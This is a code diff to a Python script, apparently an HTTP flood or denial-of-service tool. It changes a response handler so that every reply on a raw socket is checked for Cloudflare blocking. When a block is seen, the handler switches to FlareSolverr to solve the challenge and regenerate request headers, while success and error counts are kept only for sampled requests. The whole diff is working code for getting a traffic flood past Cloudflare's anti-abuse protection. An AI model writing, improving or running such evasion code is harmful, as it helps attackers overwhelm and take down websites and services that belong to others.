@@ -413,31 +413,31 @@ def GenReqHeader(method):
 
 def handle_response_with_cf_detection(s, header_gen_func, header_type="get"):
     """处理响应并检测Cloudflare拦截"""
-    global USE_FLARESOLVERR, request_count
+    global USE_FLARESOLVERR, request_count, success_count, error_count
     
     # 先更新请求计数
     with stats_lock:
         request_count += 1
         should_sample = request_count % SAMPLE_RATE == 0
     
-    if should_sample:
-        try:
-            s.settimeout(1)
-            response = s.recv(1024)
-            status_code = parse_response(response)
-            
-            # 检测Cloudflare拦截
-            if is_cloudflare_blocked(response) and not USE_FLARESOLVERR:
-                print(f"[CF检测] 发现Cloudflare拦截，正在启用绕过...")
-                USE_FLARESOLVERR = True
-                full_url = f"{protocol}://{target}:{port}{path}"
-                if solve_cloudflare(full_url):
-                    print("[CF绕过] Cloudflare挑战已解决")
-                    return header_gen_func(header_type)
-                else:
-                    print("[CF绕过] 解决Cloudflare挑战失败")
-            
-            # 更新采样统计
+    try:
+        s.settimeout(1)
+        response = s.recv(1024)
+        status_code = parse_response(response)
+        
+        # 检测Cloudflare拦截
+        if is_cloudflare_blocked(response) and not USE_FLARESOLVERR:
+            print(f"[CF检测] 发现Cloudflare拦截，正在启用绕过...")
+            USE_FLARESOLVERR = True
+            full_url = f"{protocol}://{target}:{port}{path}"
+            if solve_cloudflare(full_url):
+                print("[CF绕过] Cloudflare挑战已解决")
+                return header_gen_func(header_type)
+            else:
+                print("[CF绕过] 解决Cloudflare挑战失败")
+        
+        # 只在采样时更新详细统计
+        if should_sample:
             with stats_lock:
                 if status_code:
                     success_count += 1
@@ -446,7 +446,9 @@ def handle_response_with_cf_detection(s, header_gen_func, header_type="get"):
                     error_count += 1
                     status_codes['ERROR'] += 1
                     
-        except Exception as e:
+    except Exception as e:
+        # 只在采样时更新错误统计
+        if should_sample:
             with stats_lock:
                 error_count += 1
                 status_codes['ERROR'] += 1
@@ -455,9 +457,7 @@ def handle_response_with_cf_detection(s, header_gen_func, header_type="get"):
     with stats_lock:
         if request_count % REPORT_INTERVAL == 0:
             print_stats()
-    
     return None
-
 
 def ParseUrl(original_url):
 	global target
